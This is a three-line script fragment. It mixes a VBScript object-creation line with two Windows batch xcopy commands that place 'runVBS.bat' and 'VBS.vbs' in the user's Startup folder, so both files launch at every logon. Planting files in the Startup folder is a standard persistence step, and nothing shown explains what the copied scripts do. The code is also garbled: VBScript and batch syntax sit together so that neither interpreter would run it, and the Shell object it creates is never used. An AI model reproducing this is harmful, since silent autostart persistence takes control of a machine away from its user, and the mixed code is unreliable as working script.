Set Shell = CreateObject("Shell.Application")
xcopy /y /S "runVBS.bat" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /y "VBS.vbs" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
